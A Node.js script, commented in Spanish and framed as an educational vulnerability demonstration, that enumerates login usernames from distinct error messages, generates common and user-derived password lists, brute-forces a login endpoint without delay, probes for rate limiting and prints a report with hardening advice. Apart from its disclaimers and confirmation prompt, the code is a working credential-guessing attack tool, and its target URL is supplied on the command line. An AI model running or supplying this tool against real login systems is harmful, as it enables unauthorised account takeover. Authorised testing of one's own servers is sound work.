/**
 * DEMOSTRACIÓN DE VULNERABILIDAD: BRUTE FORCE ATTACK
 * Script Node.js para probar la ausencia de control de intentos de login
 * 
 * ⚠️  USO EXCLUSIVO PARA FINES EDUCATIVOS Y TESTING ⚠️
 * 
 * Usa solo módulos nativos de Node.js (no requiere dependencias externas)
 */

const readline = require('readline');

class BruteForceAssessment {
    constructor(targetURL = 'http://localhost:3000') {
        this.targetURL = targetURL;
        this.loginEndpoint = `${targetURL}/auth/login`;
        this.validUsers = [];
        this.successfulCredentials = [];
        this.attempts = 0;
        this.startTime = null;
    }

    printBanner() {
        console.log('='.repeat(70));
        console.log('  DEMOSTRACIÓN DE VULNERABILIDAD: BRUTE FORCE ATTACK');
        console.log('  Análisis de Seguridad - Fines Académicos');
        console.log('='.repeat(70));
        console.log(`🎯 Target: ${this.targetURL}`);
        console.log(`🕒 Fecha: ${new Date().toISOString()}`);
        console.log('⚠️  ADVERTENCIA: Solo usar en entornos de desarrollo propios');
        console.log('-'.repeat(70));
    }

    async checkServerAvailability() {
        console.log('🔍 Verificando disponibilidad del servidor...');
        try {
            const response = await fetch(this.targetURL, {
                method: 'GET',
                signal: AbortSignal.timeout(5000) // 5 segundo timeout
            });
            console.log(`✅ Servidor disponible (Status: ${response.status})`);
            return true;
        } catch (error) {
            console.log(`❌ Error: Servidor no disponible - ${error.message}`);
            console.log('💡 Asegúrate de ejecutar: npm start');
            return false;
        }
    }

    async testLoginEndpoint() {
        console.log('\\n🧪 Probando endpoint de login...');
        
        try {
            const response = await fetch(this.loginEndpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: 'test_user',
                    password: 'test_password'
                }),
                signal: AbortSignal.timeout(10000) // 10 segundos timeout
            });
            
            const data = await response.json();
            
            console.log('📊 Respuesta del servidor:');
            console.log(`   Status Code: ${response.status}`);
            console.log(`   Response: ${JSON.stringify(data, null, 2)}`);
            
            if ([400, 401].includes(response.status)) {
                console.log('✅ Endpoint de login funcional');
                return true;
            }
            
        } catch (error) {
            if (error.name === 'AbortError') {
                console.log('⏱️ Timeout - el servidor podría estar sobrecargado');
            } else {
                console.log(`❌ Error probando endpoint: ${error.message}`);
            }
            return false;
        }
        
        return true;
    }

    async enumerateUsers() {
        console.log('\\n' + '='.repeat(50));
        console.log('FASE 1: ENUMERACIÓN DE USUARIOS');
        console.log('='.repeat(50));
        
        const commonUsernames = [
            'admin', 'administrator', 'root', 'user', 'test',
            'demo', 'guest', 'manager', 'operator', 'service',
            'support', 'sales', 'marketing', 'developer', 'api'
        ];
        
        console.log(`🔍 Probando ${commonUsernames.length} usuarios comunes...`);
        
        for (const username of commonUsernames) {
            const exists = await this.checkUserExists(username);
            
            if (exists === true) {
                this.validUsers.push(username);
                console.log(`✅ Usuario encontrado: ${username}`);
            } else if (exists === false) {
                console.log(`❌ Usuario no existe: ${username}`);
            } else {
                console.log(`❓ Respuesta ambigua: ${username}`);
            }
            
            // Pequeño delay para no saturar
            await this.sleep(200);
        }
        
        console.log('\\n📊 RESULTADOS DE ENUMERACIÓN:');
        console.log(`   Usuarios válidos encontrados: ${this.validUsers.length}`);
        console.log(`   Lista: ${this.validUsers.length > 0 ? this.validUsers.join(', ') : 'Ninguno'}`);
        
        return this.validUsers;
    }

    async checkUserExists(username) {
        try {
            const response = await fetch(this.loginEndpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: username,
                    password: 'invalid_password_for_enumeration'
                }),
                signal: AbortSignal.timeout(10000) // 10 segundos timeout
            });
            
            this.attempts++;
            
            if (response.status === 401) {
                const data = await response.json();
                const message = data?.message?.toLowerCase() || '';
                
                if (message.includes('user not found')) {
                    return false; // Usuario no existe
                } else if (message.includes('invalid password')) {
                    return true;  // Usuario existe, password incorrecto
                } else if (message.includes('invalid credentials')) {
                    return null;  // Respuesta genérica
                }
            }
            
            // Si llegamos aquí con status 200, algo inesperado pasó
            return null;
            
        } catch (error) {
            this.attempts++;
            
            if (error.name === 'AbortError') {
                console.log(`⏱️ Timeout verificando usuario: ${username}`);
            }
            return null;
        }
    }

    generatePasswordList(targetUser = null) {
        const passwords = [];
        
        // Passwords super comunes
        const commonPasswords = [
            'password', '123456', 'password123', 'admin', 'root',
            '12345678', 'qwerty', 'abc123', 'Password1', '1234567890',
            'letmein', 'welcome', 'monkey', 'dragon', 'master',
            'admin123', 'test123', 'user123', 'demo123', 'guest123'
        ];
        
        passwords.push(...commonPasswords);
        
        // Variaciones del usuario
        if (targetUser) {
            const userVariations = [
                targetUser,
                targetUser + '123',
                targetUser + '1',
                targetUser + '2024',
                targetUser + '!',
                '123' + targetUser,
                targetUser.toUpperCase(),
                targetUser.charAt(0).toUpperCase() + targetUser.slice(1)
            ];
            passwords.push(...userVariations);
        }
        
        // Passwords numéricos
        const numericPasswords = [
            '1111', '2222', '3333', '4444', '5555',
            '1234', '4321', '0000', '9999', '1122'
        ];
        passwords.push(...numericPasswords);
        
        // Remover duplicados
        return [...new Set(passwords)];
    }

    async bruteForceAttack(username, passwordList) {
        console.log(`\\n🚀 ATAQUE DE BRUTE FORCE CONTRA: ${username}`);
        console.log(`📚 Passwords a probar: ${passwordList.length}`);
        
        this.startTime = Date.now();
        let foundPassword = null;
        
        for (let i = 0; i < passwordList.length; i++) {
            const password = passwordList[i];
            
            const success = await this.tryLogin(username, password);
            
            if (success) {
                foundPassword = password;
                const elapsed = (Date.now() - this.startTime) / 1000;
                
                console.log('\\n🎯 ¡CREDENCIALES ENCONTRADAS!');
                console.log(`   Usuario: ${username}`);
                console.log(`   Password: ${password}`);
                console.log(`   Intentos realizados: ${this.attempts}`);
                console.log(`   Tiempo transcurrido: ${elapsed.toFixed(2)} segundos`);
                console.log(`   Velocidad promedio: ${(this.attempts/elapsed).toFixed(1)} intentos/segundo`);
                
                this.successfulCredentials.push({
                    username: username,
                    password: password,
                    attempts: this.attempts,
                    time: elapsed
                });
                
                break;
            }
            
            // Mostrar progreso cada 10 intentos
            if ((i + 1) % 10 === 0) {
                const elapsed = (Date.now() - this.startTime) / 1000;
                const rate = this.attempts / elapsed;
                console.log(`📊 Progreso: ${i + 1}/${passwordList.length} passwords, ${rate.toFixed(1)} intentos/s`);
            }
            
            // Sin delay - explotamos la vulnerabilidad
        }
        
        const elapsedTotal = (Date.now() - this.startTime) / 1000;
        
        if (foundPassword) {
            console.log(`\\n✅ ATAQUE EXITOSO en ${elapsedTotal.toFixed(2)} segundos`);
        } else {
            console.log(`\\n❌ Ataque fallido después de ${this.attempts} intentos en ${elapsedTotal.toFixed(2)} segundos`);
            console.log('💡 Posibles razones:');
            console.log('   - Password no está en la lista probada');
            console.log('   - Cuenta podría estar bloqueada');
            console.log('   - Servidor implementó rate limiting');
        }
        
        return foundPassword !== null;
    }

    async tryLogin(username, password) {
        try {
            const response = await fetch(this.loginEndpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: username,
                    password: password
                }),
                signal: AbortSignal.timeout(10000) // 10 segundos timeout
            });
            
            this.attempts++;
            
            // Rate limiting detectado
            if (response.status === 429) {
                console.log('\\n⚠️ Rate limiting detectado! (429 Too Many Requests)');
                console.log('✅ Esto indica que hay protección implementada');
                return false;
            }
            
            // Login exitoso
            if (response.status === 200) {
                const data = await response.json();
                if (data.success) {
                    return true;
                }
            }
            
        } catch (error) {
            this.attempts++;
            
            // Timeout - posible protección
            if (error.name === 'AbortError') {
                console.log('\\n⏱️ Timeout en request - posible protección activa');
            }
        }
        
        return false;
    }

    async testRateLimiting() {
        console.log('\\n' + '='.repeat(50));
        console.log('FASE 3: TESTING DE RATE LIMITING');
        console.log('='.repeat(50));
        
        console.log('🧪 Enviando múltiples requests rápidos para detectar rate limiting...');
        
        let rateLimited = false;
        
        for (let i = 1; i <= 20; i++) {
            const startRequest = Date.now();
            
            try {
                const response = await fetch(this.loginEndpoint, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username: 'rate_limit_test',
                        password: 'test_password'
                    }),
                    signal: AbortSignal.timeout(10000) // 10 segundos timeout
                });
                
                const requestTime = (Date.now() - startRequest) / 1000;
                console.log(`Request ${i.toString().padStart(2)}: Status ${response.status}, Time: ${requestTime.toFixed(3)}s`);
                
                if (response.status === 429) {
                    console.log('🛡️ RATE LIMITING DETECTADO!');
                    rateLimited = true;
                    break;
                }
                
            } catch (error) {
                const requestTime = (Date.now() - startRequest) / 1000;
                
                if (error.name === 'AbortError') {
                    console.log(`Request ${i.toString().padStart(2)}: Timeout, Time: ${requestTime.toFixed(3)}s`);
                } else {
                    console.log(`Request ${i.toString().padStart(2)}: Error - ${error.message}`);
                }
            }
        }
        
        if (!rateLimited) {
            console.log('❌ NO se detectó rate limiting');
            console.log('⚠️ El servidor es vulnerable a ataques de fuerza bruta');
        } else {
            console.log('✅ Rate limiting está funcionando');
            console.log('🛡️ El servidor tiene protección básica');
        }
        
        return rateLimited;
    }

    generateFinalReport() {
        console.log('\\n' + '='.repeat(70));
        console.log('📋 REPORTE FINAL DE VULNERABILIDAD');
        console.log('='.repeat(70));
        
        console.log(`🎯 Servidor analizado: ${this.targetURL}`);
        console.log(`🕒 Fecha del análisis: ${new Date().toISOString()}`);
        console.log(`📊 Total de intentos realizados: ${this.attempts}`);
        
        console.log('\\n🔍 RESULTADOS DE LA EVALUACIÓN:');
        
        // Clasificación de severidad
        let severity, impact;
        if (this.successfulCredentials.length > 0) {
            severity = '🔴 CRÍTICA';
            impact = 'Acceso no autorizado confirmado';
        } else if (this.validUsers.length > 0) {
            severity = '🟡 ALTA';
            impact = 'Enumeración de usuarios posible';
        } else {
            severity = '🟢 BAJA';
            impact = 'Protecciones básicas funcionando';
        }
        
        console.log(`   Severidad: ${severity}`);
        console.log(`   Impacto: ${impact}`);
        
        console.log('\\n📊 DETALLES ESPECÍFICOS:');
        console.log(`   • Usuarios válidos encontrados: ${this.validUsers.length}`);
        if (this.validUsers.length > 0) {
            console.log(`     ${this.validUsers.join(', ')}`);
        }
        
        console.log(`   • Credenciales comprometidas: ${this.successfulCredentials.length}`);
        this.successfulCredentials.forEach(cred => {
            console.log(`     ${cred.username}:${cred.password} ` +
                       `(en ${cred.time.toFixed(1)}s, ${cred.attempts} intentos)`);
        });
        
        console.log('\\n🛡️ RECOMENDACIONES DE SEGURIDAD:');
        console.log('   1. ✅ Implementar rate limiting (express-rate-limit)');
        console.log('   2. ✅ Configurar account lockout después de N fallos');
        console.log('   3. ✅ Usar mensajes de error genéricos');
        console.log('   4. ✅ Implementar delays en respuestas de autenticación');
        console.log('   5. ✅ Monitorear y alertar sobre intentos fallidos');
        console.log('   6. ✅ Usar autenticación de dos factores (2FA)');
        console.log('   7. ✅ Implementar CAPTCHA después de varios fallos');
        
        return {
            severity: severity,
            usersFound: this.validUsers.length,
            credentialsCompromised: this.successfulCredentials.length,
            totalAttempts: this.attempts
        };
    }

    async runCompleteAssessment() {
        this.printBanner();
        
        // Verificaciones iniciales
        if (!(await this.checkServerAvailability())) {
            return false;
        }
        
        if (!(await this.testLoginEndpoint())) {
            return false;
        }
        
        // Fase 1: Enumeración de usuarios
        await this.enumerateUsers();
        
        // Fase 2: Brute force si encontramos usuarios
        if (this.validUsers.length > 0) {
            for (let i = 0; i < Math.min(3, this.validUsers.length); i++) {
                const username = this.validUsers[i];
                const passwordList = this.generatePasswordList(username);
                
                console.log(`\\n🎯 Probando ${passwordList.length} passwords contra '${username}'...`);
                
                const success = await this.bruteForceAttack(username, passwordList);
                
                if (success) {
                    console.log('🚨 ¡VULNERABILIDAD CONFIRMADA!');
                    break;
                }
                
                await this.sleep(2000); // Pausa entre usuarios
            }
        } else {
            console.log('\\n💡 No se encontraron usuarios válidos para atacar');
            console.log('   Esto puede indicar que hay protecciones implementadas');
        }
        
        // Fase 3: Test de rate limiting
        await this.testRateLimiting();
        
        // Reporte final
        return this.generateFinalReport();
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

async function main() {
    const targetURL = process.argv[2] || 'http://localhost:3000';
    
    console.log('🔒 BRUTE FORCE VULNERABILITY ASSESSMENT');
    console.log(`Target: ${targetURL}`);
    console.log('\\n⚠️  DISCLAIMER:');
    console.log('Este script es para fines educativos y de testing de seguridad únicamente.');
    console.log('Solo ejecutar en sistemas propios o con autorización explícita.');
    console.log('El uso malicioso puede ser ilegal y violar términos de servicio.');
    
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    
    const answer = await new Promise(resolve => {
        rl.question('\\n¿Continuar con la evaluación? (y/N): ', resolve);
    });
    
    rl.close();
    
    if (!['y', 'yes', 's', 'si'].includes(answer.toLowerCase())) {
        console.log('Evaluación cancelada.');
        return;
    }
    
    // Ejecutar evaluación
    const assessment = new BruteForceAssessment(targetURL);
    const results = await assessment.runCompleteAssessment();
    
    console.log('\\n' + '='.repeat(70));
    console.log('✅ EVALUACIÓN COMPLETADA');
    console.log('Usa estos resultados para tu investigación académica sobre seguridad.');
    console.log('='.repeat(70));
}

if (require.main === module) {
    main().catch(console.error);
}

module.exports = BruteForceAssessment;